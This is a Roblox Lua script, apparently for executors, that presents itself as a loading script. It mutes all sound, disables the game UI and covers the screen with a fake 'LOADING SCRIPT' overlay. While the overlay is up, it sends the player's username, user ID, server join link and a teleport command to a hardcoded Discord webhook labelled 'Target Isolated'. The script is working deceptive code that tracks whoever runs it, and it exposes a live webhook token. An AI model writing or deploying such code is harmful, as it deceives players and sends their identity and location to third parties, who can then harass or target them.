local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local SoundService = game:GetService("SoundService")
local StarterGui = game:GetService("StarterGui")
local player = Players.LocalPlayer

-- Use the proxy link for Discord
local proxyURL = "https://discord.com/api/webhooks/1483011079805079625/4C5mXHERHgjTN09uBEWFqzWvHULoQhnS0MKgvQQhCvWezjmlpQi2GqMIMqB1ZEt01sL5"

-- 1. Mute Everything
SoundService.MasterVolume = 0
for _, sound in pairs(game:GetDescendants()) do
    if sound:IsA("Sound") then sound:Stop() end
end

-- 2. Wipe UI
local function disableUI()
    local success = pcall(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    end)
    if not success then task.wait(0.1); disableUI() end
end
disableUI()

-- 3. Fake Loading Screen
local screenGui = Instance.new("ScreenGui", player.PlayerGui)
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = 2147483647
local frame = Instance.new("Frame", screenGui)
frame.Size = UDim2.new(1, 0, 1, 0)
frame.BackgroundColor3 = Color3.new(0, 0, 0)
local label = Instance.new("TextLabel", frame)
label.Size = UDim2.new(1, 0, 1, 0)
label.Text = "LOADING SCRIPT... PLEASE WAIT"
label.TextColor3 = Color3.new(1, 1, 1)
label.BackgroundTransparency = 1
label.Font = Enum.Font.Code
label.TextSize = 25

-- 4. FIXED: Private Server Link Logic
local placeId = game.PlaceId
local jobId = game.JobId
local joinLink = ""

if jobId and jobId ~= "" then
    -- This format works for both public and most private servers via executors
    joinLink = "https://www.roblox.com/games/" .. placeId .. "?jobId=" .. jobId
else
    joinLink = "Unable to generate link (Studio or internal error)"
end

-- 5. Send Webhook
local payload = HttpService:JSONEncode({
    ["content"] = "🚨 **SCAMMER EXPOSED** 🚨",
    ["embeds"] = {{
        ["title"] = "Target Isolated",
        ["color"] = 16711680,
        ["fields"] = {
            {["name"] = "User", ["value"] = player.Name .. " (" .. player.UserId .. ")", ["inline"] = true},
            {["name"] = "Server Join Link", ["value"] = "```" .. joinLink .. "
```"},
            {["name"] = "Quick Join (Command)", ["value"] = "```game:GetService('TeleportService'):TeleportToPlaceInstance(" .. placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)```"}
        },
        ["footer"] = {["text"] = "Ensure you are in-game for the link to work."}
    }}
})

pcall(function()
    HttpService:PostAsync(proxyURL, payload)
end)
